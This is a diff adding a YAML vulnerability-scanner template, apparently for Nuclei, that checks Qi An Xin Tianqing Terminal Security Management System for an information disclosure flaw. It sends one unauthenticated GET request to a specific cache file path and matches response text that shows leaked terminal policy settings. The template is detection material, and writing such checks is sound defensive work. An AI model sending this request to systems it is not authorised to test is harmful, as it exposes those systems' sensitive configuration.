@@ -1,0 +1,27 @@
+id: cvd-2023-1314
+info:
+  name: Qi An Xin Tianqing Terminal Security Management System Information Disclosure Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Tianqing Terminal Security Management System has an information disclosure vulnerability. An attacker can read sensitive system information by constructing a special URL address.
+  tags: information-disclosure
+  reference:
+    - https://www.qianxin.com
+http:
+  - raw:
+      - |
+        GET /runtime/admin_log_conf.cache HTTP/1.1
+        Host: {{Hostname}}
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "setting/policy/client"
+          - "终端策略"
+          - "漏洞管理"
